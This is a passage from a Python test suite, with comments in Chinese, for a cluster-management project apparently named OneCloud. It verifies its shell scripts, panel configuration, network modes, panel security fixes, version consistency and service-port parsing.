    # 真正要否定的是「可执行的放行/转发命令」, 故只筛命令行 (以 iptables/nft 开头)。
    wg_cmds = [ln.strip() for ln in r3.stdout.splitlines()
               if ln.strip().startswith(("iptables", "nft", "firewall-cmd", "ufw"))
               and "51820" in ln]
    _oc_check(not wg_cmds,
              f"lan 模式清单无可执行 51820 规则 ({wg_cmds[:2]})")

    # ---------- I. 反向断言 ⑦ 远程路径前必须先取数据根 ----------
    for rel, funcs in (("scripts/deploy.sh", ("node_data_root",)),
                       ("scripts/health-check.sh", ("node_data_root",))):
        s = _oc_read(rel)
        _oc_check(all(f in s for f in funcs),
                  f"{rel} 使用 node_data_root 取远端数据根")
    isvc2 = _oc_read("scripts/install-services.sh")
    _oc_check("node_data_dir" in isvc2 and "oc_data_root" in isvc2,
              "install-services.sh 远程路径经 node_data_dir/oc_data_root")
    # 只查未注释的代码行: 注释里明明白白写着"原先写成 ${DATA_ROOT:-/mnt/sd/srv}"
    # (记录修复原因), 用整文件搜索会把这条注释误判成残留。
    isvc_code = [ln for ln in isvc2.splitlines()
                 if not ln.strip().startswith("#")]
    _oc_check(all("${DATA_ROOT:-/mnt/sd/srv}" not in ln for ln in isvc_code),
              "install-services.sh 已去掉 ${DATA_ROOT:-/mnt/sd/srv} 的恒定拼接 (仅注释提及)")

    # ---------- J. 各脚本的 mode 适配 ----------
    hc = _oc_read("scripts/health-check.sh")
    _oc_check("source \"${SCRIPT_DIR}/lib-services.sh\"" in hc,
              "health-check.sh 引入 lib-services.sh")
    _oc_check("services_install_mode" in hc and "待手动安装" in hc,
              "health-check.sh 对 manual 服务给出「待手动安装」")
    _oc_check('if [ "$inst" != "1" ]' in hc,
              "health-check.sh 未安装服务走 SKIP 分支")
    _oc_check("node_services" in hc,
              "health-check.sh 服务清单来自 inventory 而非硬编码")

    wg = _oc_read("scripts/wireguard-setup.sh")
    _oc_check("source \"${SCRIPT_DIR}/lib-services.sh\"" in wg,
              "wireguard-setup.sh 引入 lib-services.sh")
    _oc_check('if [ "$(wg_enabled)" != "1" ]' in wg,
              "wireguard-setup.sh 有 wg_enabled 闸门")
    _oc_check(re.search(r"wg_enabled\)\" != \"1\" \][\s\S]{0,600}?exit 0", wg),
              "wireguard-setup.sh 未启用时 exit 0 (不算失败)")
    _oc_check("wg_hub_node" in wg,
              "wireguard-setup.sh Hub 节点由 services.yaml 反查")

    dep = _oc_read("scripts/deploy.sh")
    _oc_check("source \"${SCRIPT_DIR}/lib-services.sh\"" in dep,
              "deploy.sh 引入 lib-services.sh")
    _oc_check("service_installed" in dep,
              "deploy.sh 按 service_installed 过滤建目录")

    bs = _oc_read("scripts/bootstrap.sh")
    _oc_check("base_pkgs_dynamic()" in bs,
              "bootstrap.sh 定义 base_pkgs_dynamic()")
    _oc_check("grep -vx 'wireguard-tools'" in bs,
              "lan 模式从核心包剔除 wireguard-tools")
    _oc_check("wg_enabled_for_bootstrap()" in bs,
              "bootstrap.sh 定义 wg_enabled_for_bootstrap()")
    _oc_check("NETWORK_MODE=" in bs and "WG_ENABLED=" in bs,
              "install.conf 记录 NETWORK_MODE / WG_ENABLED")
    _oc_check('--net-mode' in bs and "--lan-only" in bs,
              "bootstrap.sh 支持 --net-mode / --lan-only")
    _oc_check("非法的组网模式" in bs,
              "bootstrap.sh 校验 --net-mode 取值")
    _oc_check(re.search(r"if \[ \"\$SD_ENABLE\"[\s\S]{0,80}?\n", bs) is not None,
              "bootstrap.sh 结构未被破坏 (--no-sd 分支仍在)")


def test_network_modes_and_panel():
    """测试 35: 三种组网模式的端到端表现 + 面板三态 + 版本同步"""
    print("\n" + "=" * 60)
    print("测试 35: 三种组网模式 / 面板三态 / 版本同步")
    print("=" * 60)

    # ---------- A. panel/config.json 新增字段 ----------
    with open(PANEL_DIR / "config.json", encoding="utf-8") as f:
        cfg = json.load(f)
    for k in ("version", "network_mode", "network_mode_label", "wg_enabled",
              "wg_subnet", "lan_subnet"):
        _oc_check(k in cfg, f"panel/config.json 顶层含 {k}")
    _oc_check(cfg.get("network_mode") in ("lan", "wireguard", "mixed"),
              f"network_mode 取值合法 ({cfg.get('network_mode')})")
    _oc_check(isinstance(cfg.get("wg_enabled"), bool),
              "wg_enabled 是布尔 (不是字符串)")
    for nd in cfg.get("nodes", []):
        _oc_check("data_root" in nd, f"{nd['name']} 含 data_root")
        for s in nd.get("services", []):
            for k in ("installed", "optional", "install", "port"):
                if k not in s:
                    _oc_check(False, f"{nd['name']}/{s.get('name')} 缺字段 {k}")
                    break
            else:
                continue
            break
        else:
            continue
        break
    else:
        _oc_check(True, "全部节点/服务的 installed/optional/install/port 字段齐全")

    # installed 是布尔而非字符串
    all_svcs = [s for nd in cfg["nodes"] for s in nd["services"]]
    _oc_check(all(isinstance(s["installed"], bool) for s in all_svcs),
              "installed 全为布尔值")
    _oc_check(all(isinstance(s["port"], int) for s in all_svcs),
              "port 全为整数")

    # verysync 具体断言
    vy = [s for s in all_svcs if s["name"] == "verysync"]
    _oc_check(len(vy) == 1, "config.json 中 verysync 恰有一条")
    if vy:
        _oc_check(vy[0]["installed"] is False,
                  "config.json verysync installed=false (manual 未装)")
        _oc_check(vy[0]["install"] == "manual", "config.json verysync install=manual")
        _oc_check(vy[0]["optional"] is True, "config.json verysync optional=true")

    wg = [s for s in all_svcs if s["name"] == "wireguard"]
    _oc_check(len(wg) == 1, "config.json 中 wireguard 恰有一条")
    if wg:
        _oc_check(wg[0]["optional"] is True, "config.json wireguard optional=true")
        _oc_check(wg[0]["port"] == 51820,
                  f"config.json wireguard port=51820 (实测 {wg[0]['port']})")

    # ---------- B. gen-panel-config.sh 在 lan 模式下产出 ----------
    r = _oc_bash(r'''
set -u
cd "$ONECLOUD_PROJECT_ROOT"
export ONECLOUD_SKIP_DATA_ROOT_RESOLVE=1
export ONECLOUD_REMOTE_DATA_ROOT=/tmp/ocroot
_out=/tmp/oc_panel_lan.json
bash scripts/gen-panel-config.sh --out "$_out" >/dev/null 2>&1
cat "$_out"
rm -f "$_out"
''', {"ONECLOUD_NET_MODE": "lan", "ONECLOUD_PROJECT_ROOT": _oc_pp(PROJECT_ROOT)},
        timeout=420)
    if r.returncode == 0 and r.stdout.strip().startswith("{"):
        try:
            lan_cfg = json.loads(r.stdout)
            _oc_check(lan_cfg["network_mode"] == "lan",
                      "gen-panel-config: lan 模式 network_mode=lan")
            _oc_check(lan_cfg["wg_enabled"] is False,
                      "gen-panel-config: lan 模式 wg_enabled=false")
            _oc_check(all(nd.get("data_root") == "/tmp/ocroot"
                          for nd in lan_cfg["nodes"]),
                      "gen-panel-config: data_root 来自 ONECLOUD_REMOTE_DATA_ROOT")
            lwg = [s for nd in lan_cfg["nodes"] for s in nd["services"]
                   if s["name"] == "wireguard"]
            _oc_check(lwg and lwg[0]["installed"] is False,
                      "gen-panel-config: lan 模式 wireguard installed=false")
            _oc_check("WireGuard" not in lan_cfg.get("network_mode_label", ""),
                      "gen-panel-config: lan 模式 label 不含 WireGuard 字样")
        except json.JSONDecodeError as e:
            _oc_check(False, f"gen-panel-config lan 输出是合法 JSON ({e})")
    else:
        _oc_check(False, f"gen-panel-config --out 在 lan 模式可运行 (rc={r.returncode})")

    # ---------- C. 面板代码: 三态与未安装不探测 ----------
    app_src = _oc_read("panel/app.py")
    _oc_check('"installed": False' in app_src or "'installed': False" in app_src,
              "app.py 未安装服务返回 installed=False")
    _oc_check('if not service.get("installed", True):' in app_src,
              "app.py 未安装时提前返回 (不做 SSH 探测)")
    _oc_check("services_installed" in app_src,
              "app.py 汇总 services_installed")
    _oc_check("network_mode" in app_src, "app.py 透出 network_mode")
    _oc_check("wg_enabled" in app_src, "app.py 透出 wg_enabled")

    # 未安装分支必须在 SSH 调用之前
    m = re.search(r"def get_service_status\([\s\S]*?\n(?=def )", app_src)
    if m:
        body = m.group(0)
        pos_inst = body.find("installed")
        pos_ssh = body.find("_ssh_executive") if "_ssh_executive" in body else body.find("ssh")
        _oc_check(pos_inst != -1 and (pos_ssh == -1 or pos_inst < pos_ssh),
                  "get_service_status: installed 判定在 SSH 探测之前")

    # ---------- D. 三态在 CSS/JS 里都有样式与逻辑 ----------
    css = _oc_read("panel/static/css/style.css")
    _oc_check(".status-dot.notinstalled" in css,
              "style.css 有 .status-dot.notinstalled (灰色空心)")
    _oc_check(".topo-mesh" in css and "topo-lan" in css,
              "style.css 有拓扑模式样式 (topo-lan 等)")
    _oc_check(".login-card" in css, "style.css 有登录页样式")

    js = _oc_read("panel/static/js/app.js")
    _oc_check("serviceState" in js, "app.js 有 serviceState() 三态判定")
    _oc_check("currentNet" in js, "app.js 保存 currentNet 模式状态")
    _oc_check("doLogout" in js, "app.js 有 doLogout()")
    _oc_check("已装" in js and "运行" in js,
              "app.js 节点摘要显示「已装 N/M · 运行 K」")

    idx = _oc_read("panel/templates/index.html")
    _oc_check("netMode" in idx, "index.html 有 netMode 显示位")
    _oc_check("topoMode" in idx, "index.html 拓扑标题有 id=topoMode")
    _oc_check("WireGuard Mesh VPN (10.8.0.0/24)" not in idx,
              "index.html 不再硬编码 WireGuard Mesh 标题")

    _oc_check((PANEL_DIR / "templates" / "login.html").exists(),
              "panel/templates/login.html 存在")

    # ---------- E. 面板安全修复 (C-1/C-2/C-3/M-1) ----------
    _oc_check("secrets.token_urlsafe" in app_src,
              "C-1: 无 PANEL_PASS 时随机生成口令")
    _oc_check("PANEL_PASS_GENERATED" in app_src,
              "C-1: 标记 PANEL_PASS_GENERATED 并告警")
    _oc_check('os.environ.get("PANEL_PASS", "")' in app_src or
              "PANEL_PASS" in app_src and '""' in app_src,
              "C-1: PANEL_PASS 默认值为空 (不再硬编码弱口令)")
    _oc_check("PANEL_CORS_ORIGINS" in app_src,
              "C-2: CORS 来源可由 PANEL_CORS_ORIGINS 收敛")
    _oc_check("supports_credentials=True" in app_src,
              "C-2: CORS 带 supports_credentials")
    _oc_check("require_csrf_header" in app_src,
              "M-1: 定义 require_csrf_header")
    _oc_check("X-Requested-With" in app_src,
              "M-1: 校验 X-Requested-With 头")
    _oc_check("app.secret_key" in app_src, "session 需要 app.secret_key")

    # C-3: /mnt/sd 只允许作为回退默认值出现
    bad_sd = []
    for i, ln in enumerate(app_src.splitlines()):
        if "/mnt/sd" not in ln or ln.strip().startswith("#"):
            continue
        if re.search(r'=\s*"/mnt/sd"', ln) or 'or "/mnt/sd"' in ln or \
           re.search(r'get\([^)]*"/mnt/sd"', ln) or '"/mnt/sd"' in ln and "def " in ln:
            continue
        if re.search(r'"/mnt/sd"', ln):
            continue
        bad_sd.append(f"L{i+1}: {ln.strip()[:70]}")
    _oc_check(not bad_sd,
              f"C-3: app.py 的 /mnt/sd 仅作回退默认值 (违规 {len(bad_sd)})")

    # ---------- F. 版本 6 处同步 ----------
    ver_sites = {
        "README.md": r"\*\*当前版本: (v[\d.]+)\*\*",
        "panel/config.json": r'"version":\s*"([\d.]+)"',
        "panel/app.py": r'"version":\s*"([\d.]+)"',
        "scripts/gen-panel-config.sh": r'VERSION="\$\{ONECLOUD_PANEL_VERSION:-([\d.]+)\}"',
        "panel/README.md": r'"version":\s*"([\d.]+)"',
    }
    vers = {}
    for rel, pat in ver_sites.items():
        m = re.search(pat, _oc_read(rel))
        vers[rel] = m.group(1) if m else None
    uniq = set(v.lstrip("v") for v in vers.values() if v)
    _oc_check(len(uniq) == 1,
              f"5 个文件版本声明一致 ({dict(vers)})")
    _oc_check(list(uniq)[0] == "1.6.0" if uniq else False,
              f"版本为 1.6.0 (实测 {uniq})")

    # README 变更说明标题也要跟上
    rd = _oc_read("README.md")
    _oc_check("## 🚀 v1.6.0 变更说明" in rd,
              "README.md 有 v1.6.0 变更说明章节")


def test_services_lib_perf_and_ports():
    """测试 36: lib-services 性能回归 + 容器端口解析 (两个真实缺陷)

    背景: 一次 `gen-panel-config.sh` 实测耗时 160s, 排查出两个独立缺陷:
      缺陷 A 生成器对每个节点调 oc_data_root -> SSH 探测 (空闲节点白等 4~5s/节点)
      缺陷 B 容器服务端口全为 0: _svc_first_port 里 `${!_SVC_PORTMAP}` 在
             `set -u` 下对"已声明但为空"的关联数组报 unbound variable, 报错被
             2>/dev/null 吞掉 -> 所有 ports: [...] 形式的服务端口退化成 0
    本组把两者都钉成断言, 防止回归。
    """
    print("\n" + "=" * 60)
    print("测试 36: lib-services 性能回归 + 容器端口解析")
    print("=" * 60)

    libsvc = _oc_read("scripts/lib-services.sh")
    libnodes = _oc_read("scripts/lib-nodes.sh")
    gen = _oc_read("scripts/gen-panel-config.sh")

    # ---------- A. 生成器不得在每节点做 SSH ----------
    _oc_check("oc_static_data_root()" in libsvc,
              "lib-services.sh 定义非阻塞数据根 oc_static_data_root()")
    _oc_check("static_data_root()" in libnodes,
              "lib-nodes.sh 定义非阻塞数据根 static_data_root()")
    _oc_check("oc_static_data_root" in gen,
              "gen-panel-config.sh 用 oc_static_data_root 取数据根 (不在每节点 SSH)")
    # 反向断言: 生成器里不许再出现会 SSH 的取法
    _oc_check(not re.search(r'droot="\$\(oc_data_root', gen),
              "gen-panel-config.sh 不再用 oc_data_root 逐节点探测 (会 SSH)")

    # ---------- B. set -u 下关联数组展开必须先判空 ----------
    m = re.search(r"_svc_first_port\(\)\s*\{[\s\S]*?\n\}", libsvc)
    _oc_check(m is not None, "_svc_first_port 函数存在")
    if m:
        # 必须剔除注释行再断言 —— 函数里正好写着解释「裸 ${!arr} 会 unbound」的
        # 注释, 不剔注释就会把说明文字当成违规代码 (本项目踩过同类坑)。
        body = "\n".join(ln for ln in m.group(0).splitlines()
                         if not ln.strip().startswith("#"))
        # 必须用带引号的 "${!arr[@]}" 且前面判过元素个数
        _oc_check("${!_SVC_PORTMAP[@]}" in body,
                  "_svc_first_port 用 \"${!_arr[@]}\" 形式展开关联数组键")
        _oc_check("#_SVC_PORTMAP[@]}" in body.replace('"', "").replace("'", ""),
                  "_svc_first_port 展开了数组元素个数做判空")
        # 裸展开 = ${!arr} (结尾直接是 }), 而非 ${!arr[@]}。
        # 不要用字符类否定式 (如 [^[]) —— [A-Za-z0-9_]+ 会回溯吞掉名字再拿
        # [^[] 去匹配字面 '[' , 正样本也会误报。直接比较展开串的结尾即可。
        bare = [x for x in re.findall(r"\$\{![^}]*\}", body) if not x.endswith("[@]}")]
        _oc_check(not bare,
                  f"_svc_first_port 不再用裸 ${{!arr}} 展开 (set -u 下会 unbound; 实际: {bare})")

    # 实测: 容器服务必须解析出真实端口 (曾全为 0)
    probe = _oc_bash(
        'set -euo pipefail; source scripts/lib-nodes.sh; '
        'source scripts/lib-services.sh; require_nodes; '
        'for s in wireguard piwigo aria2 gitea cupsd xiaomusic panel; do '
        'printf "%s=%s\\n" "$s" "$(services_port "$s")"; done',
        timeout=240)
    out = probe.stdout or ""
    expect = {"wireguard": "51820", "piwigo": "8080", "aria2": "6800",
              "gitea": "3000", "cupsd": "631", "xiaomusic": "8081",
              "panel": "9000"}
    for svc, want in expect.items():
        got = (re.search(rf"^{svc}=(\d+)", out, re.M) or [None, None])[1]
        _oc_check(got == want,
                  f"services_port {svc} = {want} (实测 {got})")

    # 整体: 至少 12 个服务有非零端口 (曾只有 2 个)
    nz = len(re.findall(r"^[a-z0-9_-]+=[1-9]\d*$", out, re.M))
    _oc_check(nz >= len(expect),
              f"容器服务端口解析正常 ({nz} 个非零, 期望 >= {len(expect)})")

    # ---------- C. set -u 严格模式不得有 unbound ----------
    strict = _oc_bash(
        'set -euo pipefail; source scripts/lib-nodes.sh; '
        'source scripts/lib-services.sh; require_nodes; '
        'services_status_table >/dev/null; '
        'for n in $(node_names); do for s in $(node_services "$n"); do '
        'service_installed "$n" "$s" >/dev/null; '
        'services_optional "$s" >/dev/null; '
        'services_install_mode "$s" >/dev/null; '
        'services_port "$s" >/dev/null; done; done; echo STRICT_OK',
        timeout=300)
    sout = (strict.stdout or "") + (strict.stderr or "")
    _oc_check("unbound variable" not in sout,
              "set -u 下无 unbound variable (关联数组展开已判空)")
    _oc_check("STRICT_OK" in sout,
              "set -u 严格模式全链路跑通")

    # ---------- D. service_field 走内存索引 (性能) ----------
    _oc_check("_SVC_FIELD_INDEX" in libnodes,
              "lib-nodes.sh 用 _SVC_FIELD_INDEX 预载字段索引")
    m2 = re.search(r"service_field\(\)\s*\{[\s\S]*?\n\}", libnodes)
    if m2:
        _oc_check("_SVC_FIELD_INDEX[" in m2.group(0),
                  "service_field 走关联数组查表 (不再 while 扫全表)")

    # ---------- E. 面板配置端口字段与清单一致 (端到端) ----------
    with open(PANEL_DIR / "config.json", encoding="utf-8") as f:
        cfg = json.load(f)
    portmap = {}
    for nd in cfg.get("nodes", []):
        for s in nd.get("services", []):
            portmap.setdefault(s["name"], s.get("port", 0))
    bad = [k for k, v in expect.items()
           if k in portmap and portmap[k] != int(v)]
    _oc_check(not bad,
              f"panel/config.json 端口字段与清单一致 (不一致: {bad})")


def main():
    print("=" * 60)
    print("OneCloud Cluster 功能验证")
    print("=" * 60)
    print(f"项目路径: {PROJECT_ROOT}")
    
    # 运行所有测试
    tests = [
        ("配置文件完整性", test_config_files),
        ("节点目录结构", test_node_directories),
        ("脚本语法检查", test_script_syntax),
        ("deploy.sh 节点映射", test_deploy_node_mapping),
        ("fallback 机制", test_fallback_mechanism),
        ("health-check 变量", test_health_check_variables),
        ("cloudflared 命令", test_cloudflared_command),
        ("panel 错误处理", test_panel_app_error_handling),
        ("xiaomusic 下载", test_xiaomusic_download),
        ("panel install-service", test_panel_install_service),
        ("服务一致性", test_service_consistency),
        ("文档化 CLI 接口契约", test_cli_contract),
        ("节点 IP 自定义与主机名", test_ip_customizable),
        ("安全与健壮性回归", test_safety_regression),
        ("面板前后端契约", test_panel_frontend_contract),
        ("bootstrap 网络取值", test_bootstrap_network_resolution),
        ("bootstrap SD与风险", test_bootstrap_sd_and_risk),
        ("init 交互式入口", test_init_entrypoint),
        ("交付物一致性", test_delivery_consistency),
        ("Python 依赖降级链", test_pydeps_fallback),
        ("bootstrap apt 源与依赖", test_bootstrap_apt_sources),
        ("bootstrap DNS 模式", test_bootstrap_dns_mode),
        ("面板监听地址", test_panel_listen_host),
        ("bootstrap apt 可选化", test_bootstrap_apt_optional),
        ("防火墙与 SSH 自检", test_network_audit),
        ("面板安装参数", test_panel_install_params),
        ("部署零防火墙改动与建议清单", test_deploy_no_firewall),
        ("脚本 usage 与实现一致性 (CLI 契约)", test_cli_usage_contract),
        ("初始化装包精简 (无头服务器)", test_bootstrap_pkg_slim),
        ("安装路径自适应 (SD卡->/opt 回退)", test_install_path_adaptive),
        ("SD 卡工具箱 (格式化/迁移/更换)", test_sd_tools),
        ("初始化部署修复 (权限/迁移/IP同步/数据根)", test_init_deploy_sync),
        ("lib-services 单一真相库 (安装态/模式/数据根)", test_lib_services),
        ("可选组件全链路适配 (7 条反向断言)", test_optional_components_chain),
        ("三种组网模式/面板三态/版本同步", test_network_modes_and_panel),
        ("lib-services 性能回归 + 容器端口解析", test_services_lib_perf_and_ports),
    ]
    
    for test_name, test_func in tests:
        log_info(f"运行测试: {test_name}")
        try:
            test_func()
        except Exception as e:
            log_fail(f"测试 '{test_name}' 异常: {str(e)}")
    
    # 生成报告
    success = generate_report()
    
    return 0 if success else 1

if __name__ == "__main__":
    sys.exit(main())
